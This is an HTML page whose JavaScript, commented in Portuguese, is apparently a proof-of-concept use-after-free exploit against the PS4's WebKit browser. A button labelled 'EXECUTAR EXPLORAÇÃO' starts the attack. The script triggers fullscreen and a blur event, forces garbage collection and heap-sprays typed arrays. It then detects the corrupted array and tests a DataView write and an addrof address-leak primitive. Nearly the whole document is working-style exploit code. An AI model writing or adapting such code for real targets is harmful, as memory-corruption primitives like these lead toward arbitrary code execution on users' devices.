<!DOCTYPE html>
<html>
<body>
    <h1>PS4 UAF Debugger v2.2 [Timing & GC Fix]</h1>
    <button onclick="run()">EXECUTAR EXPLORAÇÃO</button>
    <div id="c"></div>

    <script>
        // Configurações Globais
        let ctrls = [];
        const P_A = h2f("0x4141414141414141");
        const M_V = h2f("0xdeadbeefcafebabe");
        const W_V = h2f("0x1337133713371337");

        function h2f(hex) {
            let b = new ArrayBuffer(8), u = new Uint32Array(b);
            u[0] = parseInt(hex.slice(10), 16); u[1] = parseInt(hex.slice(2, 10), 16);
            return (new Float64Array(b))[0];
        }

        function f2h(f) {
            let b = new ArrayBuffer(8); (new Float64Array(b))[0] = f;
            let u = new Uint32Array(b);
            return "0x" + u[1].toString(16).padStart(8, '0') + u[0].toString(16).padStart(8, '0');
        }

        function log(tag, status, msg) {
            document.getElementById('c').innerHTML += `[${tag}] ${status} - ${msg}<br>`;
        }

        // Força o Garbage Collector a liberar backing stores antigos
        function forceGC() {
            for (let i = 0; i < 25; i++) new ArrayBuffer(0x1000000); 
        }

        function run() {
            log("INIT", "INFO", "Alocando pool...");
            ctrls = [];
            for(let i = 0; i < 5000; i++) {
                let a = new Float64Array(8); a[0] = i; ctrls.push(a);
            }

            log("WAIT", "INFO", "Fullscreen + OPTIONS. Aguarde o Blur.");
            document.documentElement.webkitRequestFullscreen();

            window.onblur = function() {
                log("TRIG", "INFO", "Blur detectado. Ajustando timing...");
                
                // Janela de timing para evitar o crash e permitir o spray
                setTimeout(function() {
                    forceGC();
                    log("SPRAY", "INFO", "Executando spray...");
                    let spray = [];
                    for(let i = 0; i < 10000; i++) {
                        let s = new Float64Array(8); s.fill(P_A); spray.push(s);
                    }

                    let corr = null;
                    for(let i = 0; i < ctrls.length; i++) {
                        if(ctrls[i][0] === P_A) {
                            corr = ctrls[i];
                            log("UAF", "PASS", `Detectado no Index ${i}`);
                            break;
                        }
                    }

                    if(corr) {
                        // TEST 1: Identidade
                        corr[4] = M_V;
                        for(let i=0; i<spray.length; i++) {
                            if(spray[i][4] === M_V) {
                                log("SANITY", "PASS", `Identity match com spray[${i}]`);
                                break;
                            }
                        }

                        // TEST 2: DataView Write
                        try {
                            const dv = new DataView(corr.buffer);
                            dv.setUint32(0, 0x13371337, true);
                            log("SANITY", "PASS", `DataView: ${f2h(corr[0])}`);
                        } catch(e) {}

                        // TEST 3: Prototype & addrof Primitive
                        try {
                            let target = { "ptr": 0xdead };
                            let leaker = Array.from(corr);
                            Object.setPrototypeOf(leaker, { token: 0x1337 });
                            leaker[0] = target; // Injeta ponteiro na memória compartilhada
                            
                            let addr = f2h(corr[0]);
                            if(addr !== f2h(P_A)) log("ADDROF", "PASS", `Endereço: ${addr}`);
                            else log("ADDROF", "FAIL", "Ponteiro não capturado.");
                        } catch(e) {}
                    } else {
                        log("UAF", "FAIL", "Corrupção falhou. Tente variar o tempo de espera.");
                    }
                }, 350); // Delay ideal para WebKit 537.73
            };
        }
    </script>
</body>
</html>
